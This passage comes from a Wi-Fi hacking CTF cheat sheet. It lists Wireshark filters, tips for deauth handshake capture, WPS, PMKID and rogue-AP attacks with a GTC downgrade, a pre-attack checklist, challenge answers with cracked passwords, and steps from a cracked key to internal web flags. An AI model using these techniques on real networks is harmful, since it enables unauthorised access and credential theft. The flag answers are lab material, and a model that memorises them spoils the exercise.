| `eap.type == 4` | EAP-MD5 |
| `eap.type == 25` | PEAP |
| `wlan.fc.type_subtype == 0` | Association Request |
| `wlan.fc.type_subtype == 4` | Probe Request |
| `wlan.fc.type_subtype == 8` | Beacon |
| `wlan.fc.type_subtype == 12` | Deauth |
| `wlan.bssid == xx:xx:...` | Filter BSSID |
| `wlan.sa == xx:xx:...` | Filter Source MAC |
| `http` | HTTP traffic |
| `http.cookie` | Cookies |
| `http.set_cookie` | Set-Cookie |
| `http.request.method == "POST"` | POST forms |

---

## 🚨 Section 11: Golden Tips and Common Mistakes

### ⚠️ 1. Monitor Card
- For **HCXDumptool** always use a **dedicated** monitor interface (on a separate `phy`) — not `wlan0mon`.
- For **connecting to networks** use a **managed** interface.
- After each attack, `pkill wpa_supplicant && pkill dhclient` before the next step.

### ⚠️ 2. Capture with Deauth
- **Before Deauth**, lock `airodump-ng` on the channel (`-c N`).
- Deauth **before** Capture may miss the Handshake.
- **Order:** Capture on channel → Deauth → Capture again → check `WPA handshake`.

### ⚠️ 3. WPS Locked
- `Lck: Yes` in `wash` = temporarily locked.
- Solution: `-L` (ignore) → `bully` → wait → alternative method.

### ⚠️ 4. PMKID
- Only works on a separate `phy`.
- Sometimes takes minutes to extract PMKID from AP.
- If PMKID not found, try with Deauth of a real client.

### ⚠️ 5. Enterprise
- If client **validates server certificate** → Rogue AP fails.
- Solution: `--negotiate gtc-downgrade` (capture plaintext password).
- For TLS you need a valid client certificate.

### ⚠️ 6. HMAC / Flag Format
- Enterprise flag format: `flag{DOMAIN\USERNAME:PASSWORD}`
- EAP-MD5 formula: `Response = MD5(ID || Password || Challenge)`

### ⚠️ 7. IPv6 and Client Isolation
- If `arp-scan` is empty, **Client Isolation** may be enabled.
- You can also try `nmap -sn 192.168.2.0/24`.

---

## 📁 Section 12: Structure of a Complete Project

```
~/wifi/
├── scan-01.cap            # Initial scan
├── scan-01.csv
├── scanc6-01.cap          # Channel 6 capture (wifi-mobile)
├── scanc6-01-dec.cap      # Decrypted
├── wifi-old-01.cap        # WEP
├── legacy-01.cap          # EAP
├── campus.pcapng          # PMKID
├── campus.22000           # Hash ready for hashcat
├── hostapd.hccapx         # Handshake from Rogue AP
├── hash.22000             # New hashcat format
├── open.conf              # Open network config
├── psk.conf               # PSK config
├── wep.conf               # WEP config
├── campus.conf            # WPA2-PSK config
└── hostapd-mana.conf      # Rogue AP config
```

---

## 🎓 Section 13: Final Checklist Before Each Attack

- [ ] `pkill wpa_supplicant && pkill dhclient`
- [ ] `airmon-ng check kill`
- [ ] Monitor Mode interface is active (`iw dev`)
- [ ] Target channel and BSSID identified
- [ ] NetworkManager processes stopped
- [ ] For Rogue AP: a free managed interface available
- [ ] For PMKID: dedicated monitor interface on separate phy
- [ ] Wordlist ready (`/root/rockyou-top100000.txt`)
- [ ] After obtaining PSK/KEY: `.conf` file created
- [ ] After connection: `dhclient` and `ip route` executed
- [ ] For web: gateway and internal server IPs identified

---

## 🏁 Section 14: Key Challenges and Quick Answers (from Writeup)

| # | Network | Method | Output |
|---|-------|------|--------|
| 01 | wifi-global | Scan | CH=44 |
| 02 | wifi-IT | Channel 11 scan | Client BSSID |
| 03 | (Probe) | tshark | `wifi-offices` |
| 04 | (Hidden) | mdk4 Brute-force ESSID | `wifi-free` |
| 05 | wifi-free | Connect + admin/admin | Flag |
| 06 | wifi-guest | MAC Spoofing + HTTP Sniff | `free1:Jyl1iq8UajZ1fEK` |
| 07 | wifi-old | besside-ng | `11:bb:33:cd:55` |
| 08 | wifi-mobile | Handshake + rockyou | `starwars1` |
| 09 | wifi-mobile | airdecap-ng | `192.168.2.1`, `192.168.2.8` |
| 10 | wifi-mobile | Cookie Hijack | `PHPSESSID=29622...` |
| 11 | wifi-mobile | arp-scan | Server `192.168.2.7` |
| 12 | wifi-offices | Rogue AP + Hashcat | `password1` |
| 28 | wifi-event | WPS Pixie/PIN | `@MegaPSKP@ssword!@` |
| 29 | wifi-corp-legacy | EAP-MD5 + hashcat 4800 | `WORKGROUP\administrator:pinkfloyd7` |
| 31 | wifi-campus | PMKID + hashcat 22000 | `basketball` |

---

## 🧭 Section 15: Final Step — From PSK/KEY to Flag

After obtaining the key for any network:

```bash
# 1. Create connection config
# 2. Connect
sudo wpa_supplicant -Dnl80211 -iwlanX -c ~/wifi/<name>.conf
# 3. Obtain IP
sudo dhclient wlanX -v
# 4. Identify network
ip a show wlanX
ip route | grep default
# 5. Scan internal network (if Client Isolation is disabled)
sudo arp-scan -I wlanX -l
# 6. Access web servers
curl -s -m 3 http://<IP>/ | grep -o 'flag{[^}]*}'
# 7. If login required → cookie from traffic (airdecap-ng) or credentials from HTTP Sniff
```


---

2026/11/06


